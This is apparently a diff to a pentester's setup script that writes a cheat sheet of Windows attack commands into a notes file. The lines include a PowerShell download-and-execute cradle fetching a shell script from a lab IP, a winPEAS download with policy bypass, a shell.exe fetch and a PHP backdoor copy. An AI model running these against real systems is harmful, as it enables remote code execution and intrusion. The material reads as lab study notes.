@@ -114,7 +114,7 @@ echo "any problems kill VBoxClient clipboard etc." >> $HOME/notes
 # Windows shells
 echo "" >> $HOME/notes
 echo '# Windows Shells' >> $HOME/notes
-echo 'echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8080/shell.ps1')" | iconv --to-code UTF16LE | base64 -w0' >> $HOME/notes
+echo 'echo -n "IEX(New-Object Net.WebClient).downloadString('\''http://10.10.10.10:8080/shell.ps1'\'')" | iconv --to-code UTF16LE | base64 -w0' >> $HOME/notes
 echo "powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.155/winPEAS.bat', 'C:\temp\winPEAS.bat')\"" >> $HOME/notes
 echo 'IWR http://10.10.10.10/shell.exe -OutFile shell.exe' >> $HOME/notes
 echo 'cp /usr/share/webshells/php/simple-backdoor.php .' >> $HOME/notes
